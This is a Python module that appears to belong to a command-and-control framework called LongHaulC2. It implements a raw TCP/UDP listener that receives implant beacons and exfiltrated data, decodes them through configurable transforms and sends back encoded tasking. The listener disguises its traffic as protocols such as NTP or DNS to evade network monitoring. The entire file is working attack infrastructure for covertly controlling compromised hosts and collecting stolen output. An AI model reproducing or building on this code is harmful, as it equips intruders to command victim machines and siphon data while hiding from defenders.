"""
LongHaulC2 Raw Socket Listener

Supports arbitrary protocol mimicry via TOML-defined body templates and transforms.
The profile defines exactly what bytes go on the wire — get and post look like
whatever the operator designs (NTP, DNS, FTP structure, etc.).

Disambiguation: if the profile's GET and POST transform chains each have a
distinct outermost prepend value, the server uses that binary prefix to route
packets directly to the correct handler. Falls back to try-GET-then-POST only
when no distinct prefix is available. No type byte is added to the wire.
"""

import socket
import threading
import tomllib

import msgpack
import structlog

from ..listener_bridge import handle_beacon, handle_exfil
from ..transform import apply_python_transforms, malleable_string_to_bytes, reverse_python_transforms

listener_logger = structlog.get_logger("listener")

g_profile: dict = {}
g_listener_uuid: str = ""


# ==========================================
# Token extraction (binary-safe)
# ==========================================


def _extract_raw_token(template: bytes, actual: bytes, token: bytes) -> bytes | None:
    """
    Extract the bytes that replaced `token` in the template.

    Works on binary data by splitting the template on the token to find
    a fixed prefix and suffix, then slicing those bounds from actual.
    Returns None if the actual bytes don't match the surrounding structure.
    """
    if token not in template:
        return None

    idx = template.index(token)
    prefix = template[:idx]
    suffix = template[idx + len(token) :]

    if not actual.startswith(prefix):
        return None
    if suffix and not actual.endswith(suffix):
        return None

    start = len(prefix)
    end = len(actual) - len(suffix) if suffix else len(actual)
    return actual[start:end]


# ==========================================
# Prefix-based packet discrimination
# ==========================================


def _get_outermost_prepend(transforms: list[dict]) -> bytes | None:
    """
    Return the bytes of the outermost prepend transform (last in the chain,
    since prepend is applied last and therefore sits at the start of the wire packet).
    Returns None if no prepend transform exists in the chain.
    """
    for step in reversed(transforms):
        if step.get("op") == "prepend":
            val = step.get("val", "")
            try:
                return malleable_string_to_bytes(val) if isinstance(val, str) else bytes(val)
            except Exception:
                return None
    return None


def _route_packet(
    received: bytes,
    get_config: dict,
    post_config: dict,
    client_ip: str,
    send_fn,
) -> str:
    """
    Route an incoming raw packet to beacon or exfil handling.
    Returns "get", "post", or "unroutable".

    Uses the outermost prepend bytes from each config's transform chain as a
    fast discriminator. If the packet's leading bytes uniquely match one chain's
    prepend, route directly to that handler and skip the other. Falls back to
    the original try-GET-then-POST approach when prefixes are absent or identical
    (e.g. profiles with no prepend transform).
    """
    get_meta_transforms = get_config.get("client", {}).get("metadata", {}).get("transforms", [])
    post_out_transforms = post_config.get("client", {}).get("output", {}).get("transforms", [])
    get_prefix = _get_outermost_prepend(get_meta_transforms)
    post_prefix = _get_outermost_prepend(post_out_transforms)

    starts_with_get = bool(get_prefix and received.startswith(get_prefix))
    starts_with_post = bool(post_prefix and received.startswith(post_prefix))

    # Identical prefixes → ambiguous, fall back to try-both
    if starts_with_get and starts_with_post:
        starts_with_get = starts_with_post = False

    ambiguous = not starts_with_get and not starts_with_post
    try_get = starts_with_get or ambiguous
    try_post = starts_with_post or ambiguous

    if try_get:
        ok, response = _try_get(received, get_config, client_ip)
        if ok:
            if response:
                send_fn(response)
            listener_logger.info("raw_beacon_handled", client=client_ip)
            return "get"

    if try_post:
        ok, ack = _try_post(received, post_config)
        if ok:
            if ack:
                send_fn(ack)
            listener_logger.info("raw_exfil_handled", client=client_ip)
            return "post"

    listener_logger.warning("raw_unroutable_payload", client=client_ip, bytes=len(received))
    return "unroutable"


# ==========================================
# GET / POST routing
# ==========================================


def _try_get(received: bytes, get_config: dict, client_ip: str) -> tuple[bool, bytes | None]:
    """
    Attempt to decode received bytes as a beacon (GET).
    Returns (success, response_bytes_or_None).
    """
    body_template = get_config.get("body", "<METADATA>").encode("utf-8")
    metadata_transforms = get_config.get("client", {}).get("metadata", {}).get("transforms", [])

    try:
        encoded_metadata = _extract_raw_token(body_template, received, b"<METADATA>")
        if encoded_metadata is None:
            return False, None

        raw_metadata = reverse_python_transforms(encoded_metadata, metadata_transforms)

        # Secondary guard: exfil packets have "task_uuid" in each element; beacon metadata never does.
        # This catches the fallback case where prefix matching couldn't disambiguate.
        try:
            peeked = msgpack.unpackb(raw_metadata)
            if isinstance(peeked, list) and peeked and "task_uuid" in peeked[0]:
                return False, None
        except Exception:
            pass

        task_bytes = handle_beacon(raw_metadata, client_ip, g_listener_uuid)

        if not task_bytes:
            return True, None

        server_config = get_config.get("server", {})
        server_transforms = server_config.get("output", {}).get("transforms", [])
        encoded_tasks = apply_python_transforms(task_bytes, server_transforms)

        server_body = server_config.get("body", "<OUTPUT>").encode("utf-8")
        response = server_body.replace(b"<OUTPUT>", encoded_tasks)
        return True, response

    except Exception as e:
        listener_logger.debug("raw_get_routing_failed", error=str(e))
        return False, None


def _try_post(received: bytes, post_config: dict) -> tuple[bool, bytes]:
    """
    Attempt to decode received bytes as an exfil (POST).
    Returns (success, ack_bytes).
    """
    body_template = post_config.get("body", "<OUTPUT>").encode("utf-8")
    output_transforms = post_config.get("client", {}).get("output", {}).get("transforms", [])

    try:
        encoded_output = _extract_raw_token(body_template, received, b"<OUTPUT>")
        if encoded_output is None:
            return False, b""

        raw_output = reverse_python_transforms(encoded_output, output_transforms)
        handle_exfil(raw_output)

        server_body = post_config.get("server", {}).get("body", "").encode("utf-8")
        return True, server_body

    except Exception as e:
        listener_logger.debug("raw_post_routing_failed", error=str(e))
        return False, b""


# ==========================================
# TCP server
# ==========================================


def _handle_tcp_connection(conn: socket.socket, client_ip: str, get_config: dict, post_config: dict):
    """Read one message from a TCP connection, route it, and respond."""
    try:
        received = b""
        while True:
            chunk = conn.recv(65536)
            if not chunk:
                break
            received += chunk

        if not received:
            return

        listener_logger.debug("raw_tcp_received", bytes=len(received), client=client_ip)

        _route_packet(received, get_config, post_config, client_ip, conn.sendall)

    except Exception as e:
        listener_logger.error("raw_tcp_handler_error", error=str(e), client=client_ip)
    finally:
        conn.close()


def _tcp_server(host: str, port: int, get_config: dict, post_config: dict):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(32)
        listener_logger.info("raw_tcp_listener_ready", host=host, port=port)

        while True:
            try:
                conn, addr = srv.accept()
                t = threading.Thread(
                    target=_handle_tcp_connection,
                    args=(conn, addr[0], get_config, post_config),
                    daemon=True,
                )
                t.start()
            except Exception as e:
                listener_logger.error("raw_tcp_accept_error", error=str(e))


# ==========================================
# UDP server
# ==========================================


def _udp_server(host: str, port: int, get_config: dict, post_config: dict):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as srv:
        srv.bind((host, port))
        listener_logger.info("raw_udp_listener_ready", host=host, port=port)

        while True:
            try:
                data, addr = srv.recvfrom(65536)
                client_ip = addr[0]
                listener_logger.debug("raw_udp_received", bytes=len(data), client=client_ip)

                _route_packet(data, get_config, post_config, client_ip, lambda resp: srv.sendto(resp, addr))  # noqa - check this out later: B023 Function definition does not bind loop variable `addr`

            except Exception as e:
                listener_logger.error("raw_udp_receive_error", error=str(e))


# ==========================================
# Entry point
# ==========================================


def run(
    listener_uuid: str,
    listener_port: int,
    listener_host: str,
    listener_profile_contents: str,
):
    global g_profile, g_listener_uuid
    g_listener_uuid = listener_uuid

    try:
        g_profile = tomllib.loads(listener_profile_contents)
    except Exception as e:
        listener_logger.error("raw_listener_toml_parse_failed", error=str(e))
        raise

    raw = g_profile.get("raw", {})
    get_config = raw.get("get", {})
    post_config = raw.get("post", {})

    proto = get_config.get("proto", "tcp").lower()
    listener_logger.info(
        "raw_listener_starting",
        proto=proto,
        host=listener_host,
        port=listener_port,
    )

    if proto == "udp":
        _udp_server(listener_host, listener_port, get_config, post_config)
    else:
        _tcp_server(listener_host, listener_port, get_config, post_config)
